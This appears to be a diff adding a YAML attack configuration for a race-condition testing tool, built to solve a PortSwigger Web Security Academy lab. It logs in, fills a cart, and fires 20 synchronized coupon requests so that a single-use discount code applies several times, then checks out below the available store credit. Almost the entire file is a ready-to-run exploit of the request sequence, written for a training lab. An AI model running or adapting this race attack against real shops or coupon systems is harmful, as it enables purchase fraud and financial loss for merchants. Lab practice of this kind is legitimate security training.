@@ -1,0 +1,278 @@
+# ============================================================================
+# TRECO Configuration: PortSwigger Limit Overrun Race Conditions Lab
+# ============================================================================
+#
+# Exploits a race condition in the coupon redemption system to apply a 
+# single-use discount code multiple times, reducing the price below your 
+# available store credit.
+#
+# Lab: https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
+#
+# Usage:
+#   export LAB_HOST="YOUR-LAB-ID.web-security-academy.net"
+#   uv run treco portswigger-limit-overrun.yaml
+#
+# ============================================================================
+
+metadata:
+  name: "PortSwigger - Limit Overrun Race Conditions"
+  version: "1.0"
+  author: "Hack N' Roll Security Team"
+  vulnerability: "CWE-362"
+  description: |
+    Exploits race condition in POST /cart/coupon to apply 20% discount 
+    multiple times, bypassing single-use validation.
+
+config:
+  host: "{{ env('LAB_HOST', '0a1b2c3d4e5f.web-security-academy.net') }}"
+  port: 443
+  tls:
+    enabled: true
+    verify_cert: false
+  http:
+    follow_redirects: false
+
+entrypoints:
+  - state: get_login_page
+    input:
+      username: "wiener"
+      password: "peter"
+      coupon_code: "PROMO20"
+      product_id: "1"
+
+# ============================================================================
+# STATES
+# ============================================================================
+
+states:
+
+  # --------------------------------------------------------------------------
+  # Authentication Flow
+  # --------------------------------------------------------------------------
+
+  get_login_page:
+    description: "Get CSRF token from login page"
+    request: |
+      GET /login HTTP/1.1
+      Host: {{ config.host }}
+
+    extract:
+      csrf:
+        type: xpath
+        pattern: '//input[@name="csrf"]/@value'
+      session:
+        type: cookie
+        pattern: session
+
+    logger:
+      on_state_enter: |
+
+        ╔═══════════════════════════════════════════════════════════════════════╗
+        ║  🦎 PortSwigger - Limit Overrun Race Condition                        ║
+        ╠═══════════════════════════════════════════════════════════════════════╣
+        ║  🎯 Target: {{ "%-57s" | format(config.host)                       }} ║
+        ║  🎟️  Coupon: {{ "%-57s" | format(coupon_code)                      }} ║
+        ╚═══════════════════════════════════════════════════════════════════════╝
+
+    next:
+      - on_status: 200
+        goto: login
+
+  login:
+    description: "Authenticate with credentials"
+    request: |
+      POST /login HTTP/1.1
+      Host: {{ config.host }}
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: session={{ get_login_page.session }}
+      
+      username={{ username }}&password={{ password }}&csrf={{ get_login_page.csrf }}
+
+    extract:
+      session:
+        type: cookie
+        pattern: session
+
+    logger:
+      on_state_leave: |
+        🔐 Logged in as '{{ username }}' (session: {{ login.session }})
+
+    next:
+      - on_status: 302
+        goto: add_to_cart
+      - on_status: 200
+        goto: login_failed
+
+  login_failed:
+    description: "Authentication failed"
+    logger:
+      on_state_enter: |
+        ❌ Login failed - check credentials and lab URL
+    next:
+      - goto: end
+
+  # --------------------------------------------------------------------------
+  # Cart Setup
+  # --------------------------------------------------------------------------
+
+  add_to_cart:
+    description: "Add Leather Jacket to cart"
+    request: |
+      POST /cart HTTP/1.1
+      Host: {{ config.host }}
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: session={{ login.session }}
+      
+      productId={{ product_id }}&redir=PRODUCT&quantity=1
+
+    logger:
+      on_state_leave: |
+        🛒 Added product #{{ product_id }} to cart
+
+    next:
+      - on_status: 302
+        goto: view_cart_before
+
+  view_cart_before:
+    description: "Check cart before attack"
+    request: |
+      GET /cart HTTP/1.1
+      Host: {{ config.host }}
+      Cookie: session={{ login.session }}
+
+    extract:
+      csrf:
+        type: xpath
+        pattern: '//form[@id="coupon-form"]//input[@name="csrf"]/@value'
+      total:
+        type: regex
+        pattern: '<th>Total:</th>\s*<th>\$([0-9]+\.[0-9]{2})'
+      credit:
+        type: regex
+        pattern: 'Store credit: \$([0-9]+\.[0-9]{2})'
+
+    logger:
+      on_state_leave: |
+        💰 Total: ${{ view_cart_before.total }} | 💳 Credit: ${{ view_cart_before.credit }}
+
+    next:
+      - on_status: 200
+        goto: race_apply_coupon
+
+  # --------------------------------------------------------------------------
+  # Race Attack
+  # --------------------------------------------------------------------------
+
+  race_apply_coupon:
+    description: "Race condition - apply coupon multiple times"
+    request: |
+      POST /cart/coupon HTTP/1.1
+      Host: {{ config.host }}
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: session={{ login.session }}
+      
+      csrf={{ view_cart_before.csrf }}&coupon={{ coupon_code }}
+
+    race:
+      threads: 20
+      sync_mechanism: barrier
+      connection_strategy: multiplexed
+      thread_propagation: single
+
+    logger:
+      on_state_enter: |
+
+        ┌──────────────────────────────────────────────────────────────┐
+        │  ⚡ RACE ATTACK                                              │
+        ├──────────────────────────────────────────────────────────────┤
+        │  🔗 Endpoint:  POST /cart/coupon                             │
+        │  🧵 Threads:   20                                            │
+        │  🔧 Strategy:  preconnect + barrier                          │
+        └──────────────────────────────────────────────────────────────┘
+
+      on_state_leave: ✨ Race complete
+
+      on_thread_leave: |
+        {% if 'Coupon applied' in response.text %}
+        🟢 Coupon applied
+        {% elif 'Coupon already applied' in response.text %}
+        🔴 Already applied
+        {% else %}
+        🟡 {{ response.status_code }}
+        {% endif %}
+        
+    next:
+      - goto: view_cart_after
+
+  # --------------------------------------------------------------------------
+  # Results
+  # --------------------------------------------------------------------------
+
+  view_cart_after:
+    description: "Check cart after attack"
+    request: |
+      GET /cart HTTP/1.1
+      Host: {{ config.host }}
+      Cookie: session={{ login.session }}
+
+    extract:
+      total:
+        type: regex
+        pattern: '<th>Total:</th>\s*<th>\$([0-9]+\.[0-9]{2})'
+      checkout_csrf:
+        type: xpath
+        pattern: '//form[@action="/cart/checkout"]//input[@name="csrf"]/@value'
+
+    logger:
+      on_state_leave: |
+
+        ┌──────────────────────────────────────────────────────────────┐
+        │  📊 RESULTS                                                  │
+        ├──────────────────────────────────────────────────────────────┤
+        │  💵 Before: ${{ "%-46s" | format(view_cart_before.total) }}  |
+        │  💵 After:  ${{ "%-46s" | format(view_cart_after.total)  }}  |
+        │  💳 Credit: ${{ "%-46s" | format(view_cart_before.credit)}}  |
+        {% if view_cart_after.total | float <= view_cart_before.credit | float %}
+        ├──────────────────────────────────────────────────────────────┤
+        │  🎉 VULNERABLE - Total is within store credit!               │
+        {% else %}
+        ├──────────────────────────────────────────────────────────────┤
+        │  ⚠️  Need more discounts - try increasing threads             │
+        {% endif %}
+        └──────────────────────────────────────────────────────────────┘
+
+    next:
+      - on_status: 200
+        goto: checkout
+
+  checkout:
+    description: "Complete purchase"
+    request: |
+      POST /cart/checkout HTTP/1.1
+      Host: {{ config.host }}
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: session={{ login.session }}
+      
+      csrf={{ view_cart_after.checkout_csrf }}
+
+    logger:
+      on_state_leave: |
+        {% if response.status in [302, 303] %}
+
+        ╔══════════════════════════════════════════════════════════════╗
+        ║  🏆 LAB SOLVED!                                              ║
+        ╚══════════════════════════════════════════════════════════════╝
+
+        {% elif 'Not enough store credit' in response.text %}
+        💸 Insufficient credit - increase threads and retry
+        {% else %}
+        🔍 Response: {{ response.status }}
+        {% endif %}
+
+        {{ response.raw_response }}
+
+    next:
+      - goto: end
+
+  end:
+    description: "Complete"
